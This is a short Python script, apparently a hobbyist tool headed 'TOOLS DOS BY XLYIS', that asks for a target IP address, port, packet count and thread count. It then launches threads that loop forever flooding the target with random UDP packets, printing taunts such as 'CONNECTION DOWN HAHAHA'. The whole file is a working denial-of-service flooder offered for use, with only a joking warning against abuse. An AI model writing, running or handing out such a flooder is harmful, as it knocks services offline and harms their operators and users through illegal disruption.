import random
import threading
import socket

print(" TOOLS DOS BY XLYIS    ")  
print(" DON'T ABUSE MY FRIEND ")
ip_target=str(input("ip : "))
port_target=int(input("port : "))
paket=int(input("paket : "))
thread=int(input("thread : "))

def ddos():
    team = random._urandom(1180)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            wib = (str(ip_target),int(port_target))
            for x in range(paket):
                s.sendto(team,wib)
        except:
            print("DOWN NGAK TUH") 
    
print("CONNECTION DOWN HAHAHA")

            
for y in range(thread):
    th = threading.Thread(target = ddos)
    th.start()                          